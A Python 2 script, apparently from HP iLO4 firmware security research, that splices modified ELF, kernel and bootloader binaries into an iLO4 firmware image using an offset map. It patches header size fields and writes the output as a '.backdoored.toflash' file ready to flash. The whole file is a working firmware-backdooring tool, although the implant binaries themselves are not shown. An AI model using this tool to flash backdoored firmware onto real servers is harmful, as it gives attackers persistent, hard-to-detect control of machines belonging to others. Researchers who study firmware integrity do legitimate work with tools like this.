#!/usr/bin/python

import sys
import json
from struct import pack
from ilo4lib import *

if len(sys.argv) < 6:
    print "usage: %s <firmware.bin> <firmware.map> <elf.bin> <kernel_main.bin> <bootloader.bin>" % sys.argv[0]
    sys.exit(1)

with open(sys.argv[1], "rb") as f:
    firmware = f.read()

with open(sys.argv[2], "rb") as f:
    firmware_map = json.loads(f.read())

with open(sys.argv[3], "rb") as f:
    elf_data = f.read()

with open(sys.argv[4], "rb") as f:
    kernel_data = f.read()

with open(sys.argv[5], "rb") as f:
    bootloader_data = f.read()

print "[+] Compressing ELF... please take a coffee..."
print """
     )))
    (((
  +-----+
  |     |]
  `-----'
"""  
elf_comp = compress(elf_data)
comp_size = len(elf_comp)
dec_size = len(elf_data)
print "\tCompressed 0x%x -> 0x%x" % (dec_size, comp_size)

# Header
firmware = firmware[:firmware_map["ELF_HDR"] + 0x2c] + pack("<2L", dec_size, comp_size + 0x444) + firmware[firmware_map["ELF_HDR"] + 0x34:]
# Size + Content
firmware = firmware[:firmware_map["ELF"]] + pack("<L", comp_size) + elf_comp + firmware[firmware_map["ELF"]+len(elf_comp)+4:]

print "[+] Compressing Kernel..."
kernel_comp = compress(kernel_data)
comp_size = len(kernel_comp)
dec_size = len(kernel_data)
print "\tCompressed 0x%x -> 0x%x" % (dec_size, comp_size)

# Header
firmware = firmware[:firmware_map["KERNEL_MAIN_HDR"] + 0x2c] + pack("<2L", dec_size, comp_size + 0x444) + firmware[firmware_map["KERNEL_MAIN_HDR"] + 0x34:]
# Size + Content
firmware = firmware[:firmware_map["KERNEL_MAIN"]] + pack("<L", comp_size) + kernel_comp + firmware[firmware_map["KERNEL_MAIN"]+len(kernel_comp)+4:]

# Bootloader
firmware = firmware[:firmware_map["BOOTLOADER"]] + bootloader_data + firmware[firmware_map["BOOTLOADER"]+len(bootloader_data):]

with open(sys.argv[1] + ".backdoored.toflash", "wb") as f:
    f.write(firmware[firmware_map["BOOTLOADER_HDR"]:])
